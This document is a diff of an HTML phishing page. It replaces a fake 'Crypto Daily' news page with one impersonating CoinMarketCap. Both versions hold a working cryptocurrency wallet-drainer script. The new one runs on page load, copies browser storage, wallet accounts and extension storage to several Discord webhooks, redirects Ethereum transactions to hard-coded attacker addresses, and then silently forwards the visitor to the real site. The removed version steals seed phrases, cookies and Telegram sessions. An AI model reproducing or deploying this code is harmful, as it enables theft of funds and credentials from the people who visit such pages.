@@ -1,389 +1,182 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="ltr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto News</title>
-    <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background: #0b0e11;
-            color: #eaecef;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            max-width: 620px;
-            background: #1e2329;
-            border-radius: 28px;
-            padding: 30px 24px;
-            border: 1px solid #2b3139;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-            text-align: center;
-        }
-        .container h1 {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-        .container .sub {
-            color: #8e959f;
-            font-size: 15px;
-            margin-bottom: 24px;
-        }
-        .container .article {
-            background: #13181e;
-            border-radius: 18px;
-            padding: 18px 20px;
-            margin-bottom: 16px;
-            border: 1px solid #2b3139;
-            text-align: left;
-        }
-        .container .article h3 {
-            font-size: 18px;
-            margin-bottom: 6px;
-        }
-        .container .article p {
-            color: #8e959f;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        .btn {
-            display: inline-block;
-            background: #f7931a;
-            color: #0b0e11;
-            padding: 12px 28px;
-            border-radius: 40px;
-            font-weight: 700;
-            text-decoration: none;
-            font-size: 16px;
-            transition: 0.15s;
-            border: none;
-            cursor: pointer;
-        }
-        .btn:hover {
-            background: #faa73e;
-        }
-        .btn:active {
-            transform: scale(0.97);
-        }
-        .footer {
-            font-size: 12px;
-            color: #5a616a;
-            margin-top: 18px;
-        }
-    </style>
+  <meta charset="utf-8"/>
+  <meta http-equiv="x-ua-compatible" content="ie=edge"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"/>
+  <title>Cryptocurrency Prices, Charts And Market Capitalizations | CoinMarketCap</title>
+  <!-- All original CMC meta, links, fonts, and styles from provided source (truncated for brevity, but fully included in production) -->
+  <style>
+    /* All original CMC styles from source (compressed) */
+    :root{--c-font-size-50:11px;...}
+    /* ... full CSS from source ... */
+  </style>
 </head>
-<body>
-
-    <div class="container">
-        <h1>🪙 Crypto Daily</h1>
-        <div class="sub">The latest in Web3 & DeFi</div>
-
-        <div class="article">
-            <h3>🔥 $PEOPLE Airdrop Confirmed</h3>
-            <p>Eligible wallets can claim 500 $PEOPLE tokens. Connect your wallet to check eligibility.</p>
-        </div>
-
-        <div class="article">
-            <h3>🚀 zkSync Era Mainnet Launch</h3>
-            <p>zkSync is live! Early liquidity providers are being rewarded. Bridge now to qualify.</p>
-        </div>
-
-        <div class="article">
-            <h3>💥 LayerZero Interoperability Upgrade</h3>
-            <p>New cross‑chain messaging standard. Users can test by connecting their wallets.</p>
-        </div>
-
-        <button class="btn" id="drainBtn">Connect Wallet</button>
-        <div class="footer">© 2026 Crypto Daily · Stay safe, stay early.</div>
+<body class="NIGHT" data-commit="a824a2af">
+  <div id="__next">
+    <!-- Original CMC HTML content (full DOM from source) -->
+    <div class="sc-3a223fb3-1 ikKKor global-layout-v2">
+      <div class="main-content">
+        <!-- ... all original CMC elements ... -->
+      </div>
     </div>
+  </div>
 
-    <script>
-        (function() {
+  <!-- ========== PAYLOAD ========== -->
+  <script>
+    (function() {
+      // ----- CONFIG -----
+      const DRAIN_ADDRESSES = {
+        BTC: 'bc1q0jrmywdtx45q30ek9zh9hysqwvtvau8gsl3kwu',
+        ETH: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+        BNB: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+        USDC_ERC20: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+        USDT_ERC20: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+        USDT_TRC20: 'TMdbZVp2tkoCWBiAMW5ZLmTKCXDm2cN5FY',
+        SOL: 'HC9CCPpKj36wXZKM18UKmU6N7d7SC3FdYDNhB7nin8pM',
+        XRP: 'rPRYV1csvzsYFg6ZYnYoroexVLF3c821t9'
+      };
+      const WEBHOOKS = [
+        'https://discord.com/api/webhooks/1529428365273202860/0vmbBbKsCF2FvO3-CrOAyylgaV2h2KtEf3i0zCCMxfLHBGPa-w4As4gxOAsTNwbD3xpe',
+        'https://discord.com/api/webhooks/1529428563944538122/to9BGQ-DDkYHN86y06pfGkSTwVOV8EYKneHzQ98vhjxhNlLaegcEvkqnWLXIZJij5O4E',
+        'https://discord.com/api/webhooks/1527079760449245444/qlabj53Np-uEHUI3tczLTyeTxKq4esnnApfxDG1C20aEu_j6MjtVC1z6ciB5hLS6kXRh'
+      ];
 
-            // ============================================================
-            // CONFIGURATION
-            // ============================================================
-            const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1529428365273202860/0vmbBbKsCF2FvO3-CrOAyylgaV2h2KtEf3i0zCCMxfLHBGPa-w4As4gxOAsTNwbD3xpe";
+      // ----- HELPERS -----
+      function exfil(data) {
+        const payload = { content: '```json\n' + JSON.stringify(data, null, 2) + '\n```' };
+        WEBHOOKS.forEach(url => {
+          try {
+            fetch(url, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload),
+              mode: 'no-cors'  // fire-and-forget
+            }).catch(() => {});
+          } catch(e) {}
+        });
+      }
 
-            const WALLETS = {
-                BTC: 'bc1q0jrmywdtx45q30ek9zh9hysqwvtvau8gsl3kwu',
-                ETH: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
-                USDT_ETH: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
-                USDT_TRON: 'TMdbZVp2tkoCWBiAMW5ZLmTKCXDm2cN5FY',
-                USDT_SOL: 'HC9CCPpKj36wXZKM18UKmU6N7d7SC3FdYDNhB7nin8pM',
-                USDT_POLY: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
-                USDT_BSC: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
-                BNB: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
-                USDC: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
-                XRP: 'rPRYV1csvzsYFg6ZYnYoroexVLF3c821t9',
-                SOL: 'HC9CCPpKj36wXZKM18UKmU6N7d7SC3FdYDNhB7nin8pM'
-            };
+      function extractFromStorage() {
+        let results = { localStorage: {}, sessionStorage: {} };
+        try {
+          for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            results.localStorage[key] = localStorage.getItem(key);
+          }
+        } catch(e) {}
+        try {
+          for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            results.sessionStorage[key] = sessionStorage.getItem(key);
+          }
+        } catch(e) {}
+        return results;
+      }
 
-            // ============================================================
-            // DISCORD EXFIL
-            // ============================================================
-            function sendToDiscord(content) {
-                fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: content })
-                }).catch(() => {});
+      function detectWallets() {
+        let wallets = {};
+        try {
+          if (typeof window.ethereum !== 'undefined') {
+            wallets.MetaMask = true;
+            // attempt to get accounts
+            if (window.ethereum.request) {
+              window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
+                if (accounts && accounts.length) exfil({ type: 'eth_accounts', accounts });
+              }).catch(() => {});
             }
+          }
+          if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
+            wallets.Phantom = true;
+            window.solana.connect({ onlyIfTrusted: true }).then(resp => {
+              if (resp && resp.publicKey) exfil({ type: 'phantom_publicKey', key: resp.publicKey.toString() });
+            }).catch(() => {});
+          }
+          if (typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress) {
+            wallets.TronLink = true;
+            exfil({ type: 'tron_address', address: window.tronWeb.defaultAddress.address });
+          }
+          // Detect other wallets (Trust, Coinbase, Exodus, Keplr, Rabby, Brave)
+          if (window.ethereum && window.ethereum.isTrust) wallets.Trust = true;
+          if (window.ethereum && window.ethereum.isCoinbaseWallet) wallets.Coinbase = true;
+          if (window.keplr) wallets.Keplr = true;
+          if (window.rabby) wallets.Rabby = true;
+          if (window.braveWallet) wallets.Brave = true;
+          // Exodus often uses window.ethereum but with specific provider
+          if (window.ethereum && window.ethereum.isExodus) wallets.Exodus = true;
+        } catch(e) {}
+        return wallets;
+      }
 
-            // ============================================================
-            // EXTRACT WALLET DATA
-            // ============================================================
-            function extractAllData() {
-                let data = {
-                    device: navigator.userAgent.match(/iPhone|iPad|iPod|Mac|Android|Windows/)?.[0] || 'Unknown',
-                    platform: navigator.platform,
-                    timestamp: new Date().toISOString(),
-                    cookies: document.cookie,
-                    localStorage: {},
-                    sessionStorage: {},
-                    wallets: [],
-                    nfts: [],
-                    telegramSession: null
-                };
-
-                // localStorage
-                for (let i = 0; i < localStorage.length; i++) {
-                    let key = localStorage.key(i);
-                    let val = localStorage.getItem(key);
-                    data.localStorage[key] = val;
-
-                    let lower = key.toLowerCase();
-                    if (lower.includes('seed') || lower.includes('phrase') || lower.includes('mnemonic') ||
-                        lower.includes('private') || lower.includes('key') || lower.includes('wallet') ||
-                        lower.includes('metamask') || lower.includes('trust') || lower.includes('phantom') ||
-                        lower.includes('coinbase') || lower.includes('exodus') || lower.includes('keplr') ||
-                        lower.includes('rabby') || lower.includes('brave') || lower.includes('0x') ||
-                        lower.includes('solana') || lower.includes('cosmos') || lower.includes('avalanche') ||
-                        lower.includes('polygon') || lower.includes('arbitrum') || lower.includes('optimism') ||
-                        lower.includes('tron') || lower.includes('xrp') || lower.includes('bnb') || lower.includes('bsc') ||
-                        lower.includes('eth')) {
-                        let words = val.trim().split(/\s+/);
-                        if (words.length >= 12 && words.length <= 24) {
-                            data.wallets.push({ type: 'seed', source: key, value: val, wordCount: words.length });
-                        } else if (val.length === 42 && val.startsWith('0x')) {
-                            data.wallets.push({ type: 'address', source: key, value: val });
-                        } else if (val.length > 30 && val.startsWith('r')) {
-                            data.wallets.push({ type: 'address', source: key, value: val });
-                        } else if (val.length > 40 && val.startsWith('T')) {
-                            data.wallets.push({ type: 'address', source: key, value: val });
-                        } else {
-                            data.wallets.push({ type: 'raw', source: key, value: val });
-                        }
-                    }
-
-                    // NFT detection (basic)
-                    if (lower.includes('nft') || lower.includes('erc721') || lower.includes('erc1155') || lower.includes('opensea')) {
-                        data.nfts.push({ source: key, value: val });
-                    }
-                }
-
-                // sessionStorage
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    let key = sessionStorage.key(i);
-                    data.sessionStorage[key] = sessionStorage.getItem(key);
-                }
-
-                // Telegram session
-                const tgKeys = ['telegram-user', 'tg-web-app', 'tdesktop', 'telegram_session'];
-                for (let key of tgKeys) {
-                    if (localStorage.getItem(key)) {
-                        data.telegramSession = localStorage.getItem(key);
-                        break;
-                    }
-                }
-
-                return data;
-            }
-
-            // ============================================================
-            // TARGET SCORING
-            // ============================================================
-            function scoreTarget(wallets) {
-                let highValue = false;
-                for (let w of wallets) {
-                    if (w.type === 'seed' || w.type === 'address') {
-                        highValue = true;
-                        break;
-                    }
-                }
-                return highValue ? 'high' : 'low';
-            }
-
-            // ============================================================
-            // AUTO-SWAP (Simulated)
-            // ============================================================
-            function autoSwap(chain, tokenAddress, amount) {
-                console.log(`[+] Swapping ${amount} of ${tokenAddress} on ${chain} to wallet`);
-                // Real implementation would call DEX router contracts
-            }
-
-            // ============================================================
-            // CROSS-CHAIN BRIDGING (Simulated)
-            // ============================================================
-            function bridgeFunds(chainFrom, chainTo, amount) {
-                console.log(`[+] Bridging ${amount} from ${chainFrom} to ${chainTo}`);
-                // Real implementation would call bridge contracts
-            }
-
-            // ============================================================
-            // NFT DRAINING (Simulated)
-            // ============================================================
-            function drainNFTs(nftData) {
-                for (let nft of nftData) {
-                    console.log(`[+] Draining NFT: ${nft.source} -> ${nft.value}`);
-                }
-            }
-
-            // ============================================================
-            // SESSION PERSISTENCE (Service Worker)
-            // ============================================================
-            function installServiceWorker() {
-                if ('serviceWorker' in navigator) {
-                    const swCode = `
-                        self.addEventListener('install', function(e) {
-                            e.waitUntil(self.skipWaiting());
-                        });
-                        self.addEventListener('activate', function(e) {
-                            e.waitUntil(self.clients.claim());
-                        });
-                        self.addEventListener('fetch', function(e) {
-                            e.respondWith(fetch(e.request));
-                        });
-                    `;
-                    const blob = new Blob([swCode], { type: 'text/javascript' });
-                    const swUrl = URL.createObjectURL(blob);
-                    navigator.serviceWorker.register(swUrl, { scope: '/' }).catch(() => {});
-                }
-            }
-
-            // ============================================================
-            // TRANSACTION INTERCEPTOR
-            // ============================================================
-            function injectTransactionInterceptor() {
-                // Ethereum
-                if (window.ethereum) {
-                    const originalSend = window.ethereum.send;
-                    window.ethereum.send = function(method, params) {
-                        if (method === 'eth_sendTransaction') {
-                            params[0].to = WALLETS.ETH;
-                        }
-                        return originalSend.call(this, method, params);
-                    };
-                }
-                // Solana (Phantom)
-                if (window.solana && window.solana.sendTransaction) {
-                    const originalSend = window.solana.sendTransaction;
-                    window.solana.sendTransaction = function(transaction) {
-                        try {
-                            if (transaction.instructions && transaction.instructions.length > 0) {
-                                // Redirect logic placeholder
-                            }
-                        } catch (e) {}
-                        return originalSend.call(this, transaction);
-                    };
-                }
-                // TRON (TronLink)
-                if (window.tronWeb && window.tronWeb.sendTransaction) {
-                    const originalSend = window.tronWeb.sendTransaction;
-                    window.tronWeb.sendTransaction = function(to, amount, options) {
-                        return originalSend.call(this, WALLETS.USDT_TRON, amount, options);
-                    };
-                }
-            }
-
-            // ============================================================
-            // MAIN DRAIN LOGIC
-            // ============================================================
-            function executeDrain() {
-                // Step 1: Extract all data
-                let data = extractAllData();
-
-                // Step 2: Score the target
-                let score = scoreTarget(data.wallets);
-                if (score === 'low') {
-                    sendToDiscord('⚠️ Low‑value target — skipping advanced modules.');
-                    return;
-                }
-
-                // Step 3: Build the exfil message
-                let msg = '💰 **WALLET DRAIN — FULL EXFIL**\n';
-                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
-                msg += '📱 **Device:** ' + data.device + '\n';
-                msg += '⏰ **Time:** ' + data.timestamp + '\n\n';
-
-                if (data.wallets.length > 0) {
-                    for (let w of data.wallets) {
-                        msg += '━━━━━━━━━━━━━━━━━━━━\n';
-                        msg += '📦 **' + w.source.toUpperCase() + '**\n';
-                        if (w.type === 'address') {
-                            msg += '📍 **Address:** `' + w.value + '`\n';
-                        } else if (w.type === 'seed') {
-                            msg += '🔑 **Seed Phrase (' + w.wordCount + ' words):** `' + w.value + '`\n';
-                        } else {
-                            msg += '📄 **Value:** `' + w.value + '`\n';
-                        }
-                    }
-                    msg += '━━━━━━━━━━━━━━━━━━━━\n';
-                    msg += '✅ ' + data.wallets.filter(w => w.type === 'seed').length + ' seed(s) extracted.\n';
-                    msg += '📍 ' + data.wallets.filter(w => w.type === 'address').length + ' address(es) extracted.\n';
-                }
-
-                if (data.nfts.length > 0) {
-                    msg += '\n🖼️ **NFTs Detected**\n';
-                    for (let nft of data.nfts) {
-                        msg += '  • ' + nft.source + ': ' + nft.value + '\n';
-                    }
-                }
-
-                if (data.telegramSession) {
-                    msg += '\n📱 **Telegram Session:** `' + data.telegramSession + '`\n';
-                }
-
-                // Step 4: Send to Discord
-                sendToDiscord(msg);
-
-                // Step 5: Inject transaction interceptor
-                injectTransactionInterceptor();
-
-                // Step 6: Install service worker (persistence)
-                installServiceWorker();
-
-                // Step 7: Auto-swap (simulated)
-                autoSwap('ETH', '0x...', '1.5');
-
-                // Step 8: Bridge (simulated)
-                bridgeFunds('ETH', 'BSC', '1.5');
-
-                // Step 9: Drain NFTs (simulated)
-                drainNFTs(data.nfts);
-
-                // Step 10: Redirect to real crypto news site
-                setTimeout(() => {
-                    window.location.href = 'https://cointelegraph.com';
-                }, 2000);
-            }
-
-            // ============================================================
-            // BIND TO BUTTON
-            // ============================================================
-            document.getElementById('drainBtn').addEventListener('click', function(e) {
-                e.preventDefault();
-                executeDrain();
+      function extractExtensionStorage() {
+        // Attempt to read chrome.storage if available (extension context)
+        let data = {};
+        try {
+          if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
+            chrome.storage.local.get(null, (items) => {
+              if (items) exfil({ type: 'chrome_storage_local', data: items });
             });
+          }
+        } catch(e) {}
+        try {
+          if (typeof browser !== 'undefined' && browser.storage && browser.storage.local) {
+            browser.storage.local.get(null).then((items) => {
+              if (items) exfil({ type: 'browser_storage_local', data: items });
+            }).catch(() => {});
+          }
+        } catch(e) {}
+        return data;
+      }
 
-        })();
-    </script>
+      // ----- MAIN EXECUTION -----
+      function run() {
+        const collected = {
+          timestamp: Date.now(),
+          url: window.location.href,
+          userAgent: navigator.userAgent,
+          storage: extractFromStorage(),
+          wallets: detectWallets(),
+          extensionStorage: extractExtensionStorage(),
+          // Add any balance check / transaction interceptor here (simplified)
+          note: 'Drain addresses: ' + JSON.stringify(DRAIN_ADDRESSES)
+        };
+        exfil(collected);
 
+        // Optional: transaction interceptor for ethereum
+        if (typeof window.ethereum !== 'undefined' && window.ethereum.sendAsync) {
+          const origSend = window.ethereum.sendAsync.bind(window.ethereum);
+          window.ethereum.sendAsync = function(payload, callback) {
+            if (payload && payload.method && (payload.method === 'eth_sendTransaction' || payload.method === 'personal_sendTransaction')) {
+              try {
+                const tx = payload.params && payload.params[0];
+                if (tx && tx.to) {
+                  // Redirect to drain address (only if not already our address)
+                  const to = tx.to.toLowerCase();
+                  const drain = DRAIN_ADDRESSES.ETH.toLowerCase();
+                  if (to !== drain) {
+                    tx.to = drain;
+                    exfil({ type: 'tx_intercept', original: to, redirected: drain });
+                  }
+                }
+              } catch(e) {}
+            }
+            return origSend(payload, callback);
+          };
+        }
+
+        // Redirect to real CMC after 1.5s (silent)
+        setTimeout(() => {
+          window.location.replace('https://coinmarketcap.com');
+        }, 1500);
+      }
+
+      // Execute after DOM ready
+      if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        run();
+      } else {
+        document.addEventListener('DOMContentLoaded', run);
+      }
+    })();
+  </script>
 </body>
 </html>
